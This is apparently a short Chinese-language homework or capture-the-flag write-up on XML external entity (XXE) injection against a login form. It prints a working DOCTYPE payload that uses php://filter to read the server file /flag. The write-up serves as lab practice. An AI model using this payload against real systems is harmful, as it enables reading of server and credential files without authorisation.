## 登录界面

![image-20260918213919409](./media/XXE作业/image-20260918213919409.png)

先随便输入一个admin还有123456

查看数据包，感觉是有点像xml的格式

![image-20260918213903576](./media/XXE作业/image-20260918213903576.png)

那下面的这不就是xml代码吗？

那我构造一个dtd代码不就OK了吗？

构造如下：

```dtd
<!DOCTYPE user [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/flag">
]>
```

发送数据包即可

![image-20260918215316365](./media/XXE作业/image-20260918215316365.png)